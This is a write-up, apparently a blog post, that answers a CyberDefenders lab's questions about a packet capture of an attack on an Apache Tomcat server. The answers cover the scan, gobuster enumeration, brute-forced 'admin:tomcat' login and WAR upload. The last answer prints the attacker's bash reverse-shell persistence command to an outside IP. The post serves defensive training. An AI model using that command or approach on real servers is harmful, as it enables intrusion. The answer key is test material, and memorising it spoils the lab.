---
title: "[CD] Tomcat Takeover"
date: 2024-08-06
categories: [Writeups, CyberDefenders]
tags: [CyberDefenders, Writeup, Wireshark, PCAP]
---

# Scenario

Our SOC team has detected suspicious activity on one of the web servers within the company's intranet. In order to gain a deeper understanding of the situation, the team has captured network traffic for analysis. This pcap file potentially contains a series of malicious activities that have resulted in the compromise of the Apache Tomcat web server. We need to investigate this incident further.

***

# Questions

**Q:** Given the suspicious activity detected on the web server, the pcap analysis shows a series of requests across various ports, suggesting a potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server? <br />
**A:** 14.0.0.120 <br />
<img src="/assets/img/Tomcat-Takeover/Tomcat-Takeover-q1-1.png" alt="Tomcat Takeover">

***

**Q:** Based on the identified IP address associated with the attacker, can you ascertain the city from which the attacker's activities originated? <br />
**A:** Guangzhou <br />
<img src="/assets/img/Tomcat-Takeover/Tomcat-Takeover-q2-1.png" alt="Tomcat Takeover">

***

**Q:** From the pcap analysis, multiple open ports were detected as a result of the attacker's activitie scan. Which of these ports provides access to the web server admin panel? <br />
**A:** 8080 <br />
<img src="/assets/img/Tomcat-Takeover/Tomcat-Takeover-q3-1.png" alt="Tomcat Takeover">

***

**Q:** Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process? <br />
**A:** gobuster <br />
<img src="/assets/img/Tomcat-Takeover/Tomcat-Takeover-q4-1.png" alt="Tomcat Takeover">

***

**Q:** Subsequent to their efforts to enumerate directories on our web server, the attacker made numerous requests trying to identify administrative interfaces. Which specific directory associated with the admin panel was the attacker able to uncover? <br />
**A:** /manager <br />
<img src="/assets/img/Tomcat-Takeover/Tomcat-Takeover-q5-1.png" alt="Tomcat Takeover">

***

**Q:** Upon accessing the admin panel, the attacker made attempts to brute-force the login credentials. From the data, can you identify the correct username and password combination that the attacker successfully used for authorization? <br />
**A:** admin:tomcat <br />
<img src="/assets/img/Tomcat-Takeover/Tomcat-Takeover-q6-1.png" alt="Tomcat Takeover">

***

**Q:** Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data? <br />
**A:** JXQOZY.war <br />
<img src="/assets/img/Tomcat-Takeover/Tomcat-Takeover-q7-1.png" alt="Tomcat Takeover">

***

**Q:** Upon successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence? <br />
**A:** /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1' <br />
<img src="/assets/img/Tomcat-Takeover/Tomcat-Takeover-q8-1.png" alt="Tomcat Takeover">
<img src="/assets/img/Tomcat-Takeover/Tomcat-Takeover-q8-2.png" alt="Tomcat Takeover">
<img src="/assets/img/Tomcat-Takeover/Tomcat-Takeover-q8-3.png" alt="Tomcat Takeover">

***